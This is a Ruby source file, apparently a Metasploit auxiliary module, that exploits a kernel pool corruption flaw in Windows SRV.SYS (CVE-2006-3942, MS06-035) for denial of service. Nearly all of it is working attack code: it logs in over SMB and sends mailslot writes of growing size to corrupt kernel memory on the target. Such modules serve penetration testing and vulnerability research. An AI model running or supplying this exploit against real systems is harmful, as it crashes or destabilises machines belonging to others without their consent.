##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SRV.SYS Mailslot Write Corruption',
      'Description'    => %q{
        This module triggers a kernel pool corruption bug in SRV.SYS. Each
      call to the mailslot write function results in a two byte return value
      being written into the response packet. The code which creates this packet
      fails to consider these two bytes in the allocation routine, resulting in
      a slow corruption of the kernel memory pool. These two bytes are almost
      always set to "\xff\xff" (a short integer with value of -1).
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['BID', '19215'],
          ['OSVDB', '27644'],
          ['CVE', '2006-3942'],
          ['URL', 'http://www.coresecurity.com/common/showdoc.php?idx=562&idxseccion=10'],
          ['MSB', 'MS06-035'],
        ],
      'Actions'     =>
        [
          ['Attack'],
        ],
      'DefaultAction' => 'Attack',
      'DisclosureDate' => 'Jul 11 2006'
    ))

    register_options(
      [
        OptString.new('MAILSLOT', [ true,  "The mailslot name to use", 'Alerter']),
      ], self.class)

  end

  # MAILSLOT: HydraLsServer
  # MAILSLOT: Messngr
  # MAILSLOT: 53cb31a0\\UnimodemNotifyTSP

  def run

    case action.name
    when 'Attack'

      print_status("Mangling the kernel, two bytes at a time...");

      connect
      smb_login

      1.upto(1024) do |i|

        if (i % 100 == 0)
          print_status("Sending request containing #{i} bytes...")
        end

        begin
          self.simple.client.trans_mailslot("\\MAILSLOT\\"+datastore['MAILSLOT'], "X" * i)

        rescue ::Interrupt
          return

        rescue ::Exception => e

          if (i == 1)
            print_error("Failed to write any data to the mailslot: #{e}")
            break
          end
          print_error("Exception occurred on interation #{i}")
          print_error("Error: #{e.class} > #{e}")
          break
        end
      end

    # Errors:
    #  0xc0000034 = object not found
    #  0xc0000205 = insufficient resources (too much data)

    end

    disconnect
  end

end
